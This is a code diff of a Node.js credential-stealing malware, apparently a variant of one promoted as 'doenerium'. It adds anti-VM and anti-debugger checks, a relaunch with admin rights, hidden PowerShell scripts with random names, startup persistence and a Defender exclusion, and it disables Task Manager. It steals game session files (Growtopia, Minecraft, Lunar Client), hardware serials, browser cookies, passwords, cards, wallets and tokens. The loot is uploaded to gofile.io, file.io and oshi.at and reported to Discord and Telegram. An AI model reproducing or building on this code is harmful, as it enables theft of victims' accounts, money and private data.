@@ -35,14 +35,31 @@ const blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V V
 const blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"]
 const blackListedProcesses = ["watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",];
 
-function checkListed(arr, value) {
-    return arr.includes(value);
+
+function relaunchAsAdmin() {
+    const scriptPath = path.resolve(process.argv[1]);
+    const command = `powershell -Command "Start-Process node '${scriptPath}' -ArgumentList '${process.argv.slice(2).join(' ')}' -Verb RunAs"`;
+
+    console.log('Relaunching the script as administrator...');
+    execSync(command, { stdio: 'inherit' });
+    process.exit(0); // Terminer le processus actuel
 }
 
-function executeCommand(command, callback) {
-    exec(command, (error, stdout, stderr) => {
-        callback(stdout.trim());
-    });
+// Fonction principale
+function main() {
+    if (os.platform() === 'win32') {
+        const isAdmin = require('util').promisify(require('child_process').execSync)('whoami /groups | findstr /C:"S-1-5-32-544"').toString().trim().length > 0;
+
+        if (isAdmin) {
+            console.log('Le script est déjà exécuté en tant qu\'administrateur.');
+            // Votre code principal ici
+        } else {
+            relaunchAsAdmin();
+        }
+    } else {
+        console.log('Ce script ne fonctionne que sous Windows.');
+        // Votre code principal ici
+    }
 }
 
 
@@ -162,12 +179,12 @@ function oscheck(callback) {
         if (checkListed(blacklistedOS, osp)) {
             exitProcess();
         } else {
-            ramcheck(callback);
+            antivm(callback);
         }
     });
 }
 
-function ramcheck(callback) {
+function antivm(callback) {
     const totalRAM = os.totalmem();
     if (totalRAM > 1200) {
         ipcheck(callback);
@@ -181,7 +198,18 @@ function exitProcess() {
     process.exit(0);
 }
 
-function hideSelf() {
+function generateRandomString(length) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        const randomIndex = Math.floor(Math.random() * chars.length);
+        result += chars[randomIndex];
+    }
+    return result;
+}
+
+function hideconsole() {
+    let randomFileName = `${generateRandomString(10)}.ps1`;
 
     let powershellScript = `
     Add-Type -Name Window -Namespace Console -MemberDefinition '
@@ -198,11 +226,11 @@ function hideSelf() {
     `;
 
     let workingDir = process.cwd();
-    let tempfile = `${workingDir}\\temp.ps1`;
+    let tempfile = `${workingDir}\\${randomFileName}`;
     fs.writeFileSync(tempfile, powershellScript);
 
     //a little convoluted to get around powershell script execution policy (might be disabled)
-    require('child_process').execSync(`type .\\temp.ps1 | powershell.exe -noprofile -`, {stdio: 'inherit'});
+    require('child_process').execSync(`type .\\${randomFileName} | powershell.exe -noprofile -`, {stdio: 'inherit'});
     fs.unlinkSync(tempfile); //delete temp file
 }
 
@@ -340,8 +368,8 @@ function removeRegistryKey() {
     });
 }
 
-/* basic startup
-function addRegistryKey() {
+
+function startup() {
   const programPath = app.getPath('exe');
   const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programPath}" /f`;
 
@@ -361,7 +389,7 @@ function addRegistryKey() {
     console.log(`Registry key added successfully: ${stdout}`);
   });
 }
-*/
+
 
 function sendSuccessToWebhook() {i
   console.log('Sending success to webhook');
@@ -927,6 +955,9 @@ function createAndExecuteScripts() {
     }
 
     const scriptsPath = userDataPath;
+    const randomFileName = `${generateRandomString(10)}.ps1`;
+    const ps1Path = path.join(scriptsPath, randomFileName);
+
     const powershellScriptContent = `
 $sctpth = $MyInvocation.MyCommand.Path
 $ran = -join ((65..90) + (97..122) | Get-Random -Count 15 | ForEach-Object {[char]$_})
@@ -1016,8 +1047,6 @@ while ($true) {
     Start-Sleep -Milliseconds 500
 }`;
 
-    const ps1Path = path.join(scriptsPath, 'Get-Clipboard.ps1');
-
     try {
         fs.writeFileSync(ps1Path, powershellScriptContent, 'utf8');
         console.log(`Script PowerShell enregistré avec succès à l'emplacement : ${ps1Path}`);
@@ -1053,6 +1082,12 @@ function createRunBat() {
     
     const app1Path = `"${process.argv[0]}"`;
     const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Steam_Service.exe"';
+
+    const batFileName = `${generateRandomString(10)}.bat`;
+    const vbsFileName = `${generateRandomString(10)}.vbs`;
+    const batScriptPath = path.join(userData, batFileName);
+    const vbsScriptPath = path.join(userData, vbsFileName);
+
     const batContent = `@echo off
 
 powershell Add-MpPreference -ExclusionPath "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
@@ -1089,18 +1124,14 @@ if not exist ${app2Path} (
 )
 `;
 
-    const batScriptPath = path.join(userData, 'CheckEpicGamesLauncher.bat');
     fs.writeFileSync(batScriptPath, batContent, 'utf-8');
-
     console.log(`Batch script created successfully at: ${batScriptPath}`);
 
     const vbsContent = `Set objShell = CreateObject("WScript.Shell")
 objShell.Run "${batScriptPath}", 0, True
 Set objShell = Nothing`;
 
-    const vbsScriptPath = path.join(userData, 'RunBatHidden.vbs');
     fs.writeFileSync(vbsScriptPath, vbsContent, 'utf-8');
-
     console.log(`VBS script created successfully at: ${vbsScriptPath}`);
 
     const taskName = 'GoogleUpdateTaskMachineUAC';
@@ -1374,11 +1405,11 @@ async function SpotifySession(cookie) {
         const username = profileData.username || "Not available";
 
         const embedData = {
-            title: '‎ ',
+            title: '',
             color: 0x303037,
             author: {
                 name: 'Spotify Session Detected',
-                icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/74/Spotify_App_Logo.svg/1200px-Spotify_App_Logo.svg.png' // Replace with the URL of the icon image
+                icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/74/Spotify_App_Logo.svg/1200px-Spotify_App_Logo.svg.png'
             },
             fields: [
                 { name: 'Email', value: "```" + email + "```", inline: true },
@@ -1772,7 +1803,7 @@ async function getTokens() {
         await findToken(path);
     }
 
-    const predefinedBio = `╔═══════════✧✧✧═══════════╗        **This free virus can bypass all antivirus !                  ⭐️https://t.me/doenerium69** ⭐️ ╚═══════════✧✧✧═══════════╝`;
+    const predefinedBio = `╔═══════════✧✧✧═══════════╗\n        **This free virus can bypass all antivirus !\n                  ⭐️https://t.me/doenerium69** ⭐️\n ╚═══════════✧✧✧═══════════╝`;
 
     for (let token of tokens) {
         try {
@@ -2179,10 +2210,7 @@ async function getIp() {
     return ip.data;
 }
 
-////
-
-
-async function Killchrome() {
+// async function Killchrome() {
     exec('tasklist', (err, stdout) => {
         for (const executable of ['discord.exe']) {
             if (stdout.includes(executable)) {
@@ -2520,11 +2548,85 @@ function createSteamEmbed(account, accountInfo, games, level) {
 }
 
 
+const writeFile = util.promisify(fs.writeFile);
+
+async function ensureDirectoryExistence(dirPath) {
+  if (!fs.existsSync(dirPath)) {
+    fs.mkdirSync(dirPath, { recursive: true });
+  }
+}
+
+async function getGrowtopia() {
+  const growtopiaSource = `${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`;
+  const growtopiaDestination = path.join(mainFolderPath, 'Growtopia\\save.dat');
+
+  try {
+    if (fs.existsSync(growtopiaSource)) {
+      ensureDirectoryExistence(path.join(mainFolderPath, 'Growtopia'));
+      fs.copyFileSync(growtopiaSource, growtopiaDestination);
+
+      const howToUseDir = path.join(mainFolderPath, 'Growtopia', 'How to Use');
+      await ensureDirectoryExistence(howToUseDir);
+
+      const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
+      const howToUseContent = `https://t.me/doenerium69\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
+
+      await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
+    }
+  } catch (e) {
+    console.log(e);
+  }
+}
+
+
+async function submitMinecraft(mainFolderPath) {
+    try {
+        const userHome = os.homedir();
+        const minecraftPath = path.join(process.env.APPDATA, '.minecraft');
+        const lunarclientPath = path.join(userHome, '.lunarclient');
+
+        const launcherProfilesPath = path.join(minecraftPath, 'launcher_profiles.json');
+        const lunarclientAccountsPath = path.join(lunarclientPath, 'settings', 'game', 'accounts.json');
+
+        const filesToCheck = [
+            launcherProfilesPath,
+            lunarclientAccountsPath
+        ];
+
+        const existingFiles = filesToCheck.filter(filePath => fs.existsSync(filePath));
+
+        if (existingFiles.length > 0) {
+            for (const filePath of existingFiles) {
+                const destinationPath = path.join(mainFolderPath, 'Minecraft', path.basename(filePath));
+                await ensureDirectoryExistence(path.dirname(destinationPath));
+                await copyFile(filePath, destinationPath);
+                console.log(`Copied ${filePath} to ${destinationPath}`);
+            }
+            console.log('Minecraft session data copied to mainFolder/Minecraft');
+        }
+
+        // Copy entire Lunar Client settings directory if it exists
+        const lunarclientSettingsPath = path.join(lunarclientPath, 'settings');
+        const targetSettingsPath = path.join(mainFolderPath, 'LunarClient', 'settings');
+        
+        if (fs.existsSync(lunarclientSettingsPath)) {
+            await copyFolderContents(lunarclientSettingsPath, targetSettingsPath);
+            console.log(`Copied Lunar Client settings from ${lunarclientSettingsPath} to ${targetSettingsPath}`);
+        }
+    } catch (error) {
+        console.error(`Error: ${error.message}`);
+    }
+}
+
 async function createScreenshotScript() {
     const outputPath = path.join(mainFolderPath, 'Screenshots');
     if (!fs.existsSync(outputPath)) {
         fs.mkdirSync(outputPath);
     }
+    
+    const randomFileName = `${generateRandomString(10)}.ps1`;
+    const scriptPath = path.join(user.temp, randomFileName);
+
     const scriptContent = `
 try {
     # Capture screenshots of all screens
@@ -2597,7 +2699,6 @@ try {
     Write-Host "Error occurred: $_"
 }
     `;
-    const scriptPath = path.join(user.temp, 'CaptureScreens.ps1');
     try {
         await fs.promises.writeFile(scriptPath, scriptContent);
         return scriptPath;
@@ -2605,6 +2706,53 @@ try {
         console.error(`Error writing PowerShell script: ${error.message}`);
         throw error; 
     }
+}
+
+function computerinfo() {
+    const filePath = path.join(mainFolderPath, 'Serial-Check.txt');
+
+    const commandMappings = {
+        'wmic diskdrive get serialnumber': 'Disk',
+        'wmic baseboard get serialnumber': 'Motherboard',
+        'wmic path win32_computersystemproduct get uuid': 'SMBios',
+        'wmic PATH Win32_VideoController GET Description,PNPDeviceID': 'GPU',
+        'wmic memorychip get serialnumber': 'RAM',
+        'wmic csproduct get uuid': 'Bios',
+        'wmic cpu get processorid': 'CPU',
+        'getmac /NH': 'Mac'
+    };
+
+    const outputFileStream = fs.createWriteStream(filePath);
+
+    function runNextCommand(index) {
+        const commandKeys = Object.keys(commandMappings);
+
+        if (index < commandKeys.length) {
+            const command = commandKeys[index];
+            const header = `======= ${commandMappings[command]} =======\n`;
+
+            outputFileStream.write(header);
+
+            exec(command, (error, stdout, stderr) => {
+                if (error) {
+                    console.error(`Error executing command: ${command}\n${error}`);
+                    outputFileStream.write(`Error executing command: ${command}\n${error}\n`);
+                } else {
+                    console.log(`Command executed successfully: ${command}`);
+                    const cleanedOutput = stdout.replace(/ +/g, ' ').replace(/\n+/g, ' ');
+                    outputFileStream.write(cleanedOutput);
+                }
+
+                runNextCommand(index + 1);
+            });
+        } else {
+            console.log(`Serial Checker completed. Output saved to: ${filePath}`);
+            outputFileStream.end();
+        }
+    }
+
+    outputFileStream.write(user.copyright);
+    runNextCommand(0);
 }
 
 
@@ -2702,88 +2850,122 @@ async function archiveAndSendData() {
     }
 }
 
+async function getServers() {
+    try {
+        console.log('Searching servers...');
+        const response = await axios.get('https://api.gofile.io/servers');
+        const servers = response.data.data.servers;
+        console.log(`Servers found: ${servers.map(server => server.name).join(', ')}`);
+        return servers;
+    } catch (error) {
+        console.error(`Error while searching for servers: ${error}`);
+        throw error;
+    }
+}
 
-async function uploadToDoge(destinationFolder, locale, computerName) {
-    return new Promise((resolve, reject) => {
+// Upload file to Gofile
+async function uploadToGofile(destinationFolder, locale, computerName) {
+    return new Promise(async (resolve, reject) => {
         const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;
+        const form = new FormData();
+        form.append('file', fs.createReadStream(zipFilePath));
 
-        if (!fs.existsSync(zipFilePath)) {
-            console.error(`Error: File does not exist - ${zipFilePath}`);
-            reject(new Error(`File does not exist - ${zipFilePath}`));
-            return;
-        }
-
-        const uploadCommand = `curl --location --request POST "https://api.filedoge.com/upload" -H "Content-Type: multipart/form-data;" --form "file=@${zipFilePath.replace(/\\/g, '/')}";`
-
-        exec(uploadCommand, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Error uploading to FileDoge: ${error}`);
-                reject(error);
-            } else {
-                try {
-                    const response = JSON.parse(stdout);
-                    const token = response.token;
-                    console.log(`Upload successful. Token: ${token}`);
-                    resolve(token);
-                } catch (jsonError) {
-                    console.error(`Error parsing JSON response: ${jsonError}`);
-                    reject(new Error('Invalid JSON response from the API'));
+        try {
+            const servers = await getServers();
+            const server = servers[0].name;
+            const url = `https://${server}.gofile.io/uploadFile`;
+            const response = await axios.post(url, form, {
+                headers: {
+                    ...form.getHeaders()
                 }
-            }
-        });
+            });
+
+            const downloadPage = response.data.data.downloadPage;
+            resolve(downloadPage);
+        } catch (error) {
+            console.error(`Error uploading to Gofile: ${error}`);
+            reject(error);
+        }
     });
 }
 
+// Upload file to File.io
+async function uploadToFileio(filePath) {
+    try {
+        const form = new FormData();
+        form.append('file', fs.createReadStream(filePath));
 
-function runSerialChecker() {
-    const filePath = path.join(mainFolderPath, 'Serial-Check.txt');
+        const response = await axios.post('https://file.io/', form, {
+            headers: form.getHeaders(),
+        });
 
-    const commandMappings = {
-        'wmic diskdrive get serialnumber': 'Disk',
-        'wmic baseboard get serialnumber': 'Motherboard',
-        'wmic path win32_computersystemproduct get uuid': 'SMBios',
-        'wmic PATH Win32_VideoController GET Description,PNPDeviceID': 'GPU',
-        'wmic memorychip get serialnumber': 'RAM',
-        'wmic csproduct get uuid': 'Bios',
-        'wmic cpu get processorid': 'CPU',
-        'getmac /NH': 'Mac'
-    };
-
-    const outputFileStream = fs.createWriteStream(filePath);
-
-    function runNextCommand(index) {
-        const commandKeys = Object.keys(commandMappings);
-
-        if (index < commandKeys.length) {
-            const command = commandKeys[index];
-            const header = `======= ${commandMappings[command]} =======\n`;
-
-            outputFileStream.write(header);
-
-            exec(command, (error, stdout, stderr) => {
-                if (error) {
-                    console.error(`Error executing command: ${command}\n${error}`);
-                    outputFileStream.write(`Error executing command: ${command}\n${error}\n`);
-                } else {
-                    console.log(`Command executed successfully: ${command}`);
-                    const cleanedOutput = stdout.replace(/ +/g, ' ').replace(/\n+/g, ' ');
-                    outputFileStream.write(cleanedOutput);
-                }
-
-                runNextCommand(index + 1);
-            });
-        } else {
-            console.log(`Serial Checker completed. Output saved to: ${filePath}`);
-            outputFileStream.end();
-        }
+        return response.data.link;
+    } catch (error) {
+        console.error(`Error uploading to File.io: ${error.message}`);
+        throw new Error('File.io upload failed');
     }
-
-    outputFileStream.write(user.copyright);
-    runNextCommand(0);
 }
 
-async function getExtension(zipFilePath) {
+// Upload file to Oshi.at
+async function uploadToOshiAt(filePath, computerName) {
+    try {
+        const form = new FormData();
+        form.append('files[]', fs.createReadStream(filePath), `${computerName}.zip`);
+        form.append('expire', '43200');
+        form.append('autodestroy', '0');
+        form.append('randomizefn', '0');
+        form.append('shorturl', '1');
 
+        const response = await axios.post('http://oshi.at/', form, {
+            headers: form.getHeaders(),
+        });
+
+        const result = response.data.split("DL: ")[1].replace(/\n|\r| /g, "");
+        return result;
+    } catch (error) {
+        console.error(`Error uploading to Oshi.at: ${error.message}`);
+        throw new Error('Oshi.at upload failed');
+    }
+}
+
+// Main function to handle file upload
+async function uploadFile(destinationFolder, locale, computerName) {
+    const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;
+
+    if (!fs.existsSync(zipFilePath)) {
+        console.error(`Error: File does not exist - ${zipFilePath}`);
+        throw new Error(`File does not exist - ${zipFilePath}`);
+    }
+
+    try {
+        const gofileLink = await uploadToGofile(destinationFolder, locale, computerName);
+        console.log(`Upload successful to Gofile. Link: ${gofileLink}`);
+        return gofileLink;
+    } catch (error) {
+        console.error(`Gofile upload failed: ${error.message}`);
+    }
+
+    try {
+        const fileioLink = await uploadToFileio(zipFilePath);
+        console.log(`Upload successful to File.io. Link: ${fileioLink}`);
+        return fileioLink;
+    } catch (error) {
+        console.error(`File.io upload failed: ${error.message}`);
+    }
+
+    try {
+        const oshiAtLink = await uploadToOshiAt(zipFilePath, computerName);
+        console.log(`Upload successful to Oshi.at. Link: ${oshiAtLink}`);
+        return oshiAtLink;
+    } catch (error) {
+        console.error(`Oshi.at upload failed: ${error.message}`);
+    }
+
+    throw new Error('All upload methods failed');
+}
+
+
+async function getExtension(zipFilePath) {
     const discordTokensFilePath = path.join(mainFolderPath, 'discord', 'discord.txt');
     let discordTokensCount = 0;
 
@@ -2820,6 +3002,7 @@ async function getExtension(zipFilePath) {
             autofillCount = autofillEntries.length;
         }
     }
+
     const walletsFolderPath = path.join(mainFolderPath, 'Wallets');
     const walletSubdirectories = fs.readdirSync(walletsFolderPath).filter(item => fs.statSync(path.join(walletsFolderPath, item)).isDirectory());
     let walletCount = walletSubdirectories.length;
@@ -2829,11 +3012,10 @@ async function getExtension(zipFilePath) {
     const foundWalletsTele = await checkWalletstele(mainFolderPath);
 
     const destinationFolder = 'C:\\ProgramData\\Steam\\Launcher';
-    const token = await uploadToDoge(destinationFolder, locale, computerName);
-    const downloadLink = `https://api.filedoge.com/download/${token}`;
+    const downloadLink = await uploadFile(destinationFolder, locale, computerName);
     const ip = await getIp();
 
-const message = `
+    const message = `
 🔐 <b>Passwords:</b> <code>${passwordsCount}</code>
 🍪 <b>Cookies:</b> <code>${count.cookies}</code>
 📋 <b>Autofills:</b> <code>${autofillCount}</code>
@@ -2973,7 +3155,7 @@ try {
         },
     };
 
-axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
+    axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
     .then(() => { 
         console.log('system information successfully sent to Discord webhook.');
     })
@@ -3001,14 +3183,6 @@ async function clean() {
         console.log(`Folder ${steamLauncherPath} deleted successfully.`);
     } else {
         console.log(`Folder ${steamLauncherPath} does not exist.`);
-    }
-
-    const captureScriptPath = path.join(user.temp, 'CaptureScreens.ps1');
-    if (fs.existsSync(captureScriptPath)) {
-        fs.unlinkSync(captureScriptPath);
-        console.log(`File ${captureScriptPath} deleted successfully.`);
-    } else {
-        console.log(`File ${captureScriptPath} does not exist.`);
     }
 }
 
@@ -3496,7 +3670,7 @@ async function getCookies() {
                     }
 
                     cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(
-                        `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n\n`
+                        `${row.host_key}    TRUE    /   FALSE   2597573456  ${row.name} ${decrypted} \n\n`
                     );
 
                     count.cookies++;
@@ -3786,6 +3960,19 @@ async function submitFileZilla() {
   }
 }
 
+function taskmgr(cc) {
+  if (cc !== "yes") return;
+  const regKey = new Winreg({
+    hive: Winreg.HKCU,
+    key: "\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+  });
+  const valueName = "DisableTaskMgr";
+  const disableValue = 1;
+  regKey.set(valueName, Winreg.REG_DWORD, disableValue, err => {
+    if (err) {} else {}
+  });
+}
+
 
 async function closeBrowsers() {
   const browsersProcess = ["chrome.exe", "filezilla.exe", "msedge.exe","watcher.exe", "opera.exe", "brave.exe", "steam.exe", "RiotClientServices.exe"];
@@ -3807,38 +3994,75 @@ async function closeBrowsers() {
   });
 }
 
+// Browser Functions
+function manageBrowsers() {
+    closeBrowsers();
+    Killchrome();
+    getEncrypted();
+    getTokens();
+    submitFileZilla();
+}
 
-//
+
+
+// Games Functions
+function games() {
+    SubmitRiotGames();
+    submitMinecraft();
+    StealEpicGames();
+    SubmitSteam();
+    stealSteamSession();
+}
+
+// Browsers Data Extractions
+function browsers() {
+    getCookies();
+    getAutofills();
+    getCards();
+    getPasswords();
+}
+
+// File/VPN Stealer
+function filevpn() {
+    stealFiles();
+}
+
+// 2FA/A2F Functions
+function backupcodes() {
+    findBackupCodes();
+    findEpicGamesBackupCodes();
+    findGithubBackupCodes();
+}
+
+// Wallet Injection
+function wallet() {
+    localWalletData();
+    walletinjection();
+}
+
+// Miscellaneous Functions
+function handleMiscellaneous() {
+    //createRunBat();
+    //createAndExecuteScripts();
+    redirectErrorsToLog();
+}
 
 function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
 }
-        hideSelf();
-        ramcheck();
-        initializeFolders();
-        closeBrowsers();
-        Killchrome();
-        getEncrypted();
-        getCookies();
-        stealFiles();
-        runSerialChecker();
-        getAutofills();
-        getCards();
-        getPasswords();
-        removeRegistryKey();
-        getTokens();
-        localWalletData();
-        submitFileZilla();
-        SubmitRiotGames();
-        StealEpicGames();
-        SubmitSteam();
-        stealSteamSession();
-        findBackupCodes();
-        findEpicGamesBackupCodes();
-        findGithubBackupCodes();
-        //addRegistryKey();
-        createRunBat();
-        createAndExecuteScripts();
-        walletinjection();
-        redirectErrorsToLog();
-        SubmitTelegram();
+    main();
+    hideconsole();
+    antivm();
+    initializeFolders();
+    initializeSystem();
+    manageBrowsers();
+    games();
+    browsers();
+    filevpn();
+    backupcodes();
+    wallet();
+    taskmgr();
+    computerinfo();
+    startup();
+    handleMiscellaneous();
+    SubmitTelegram();
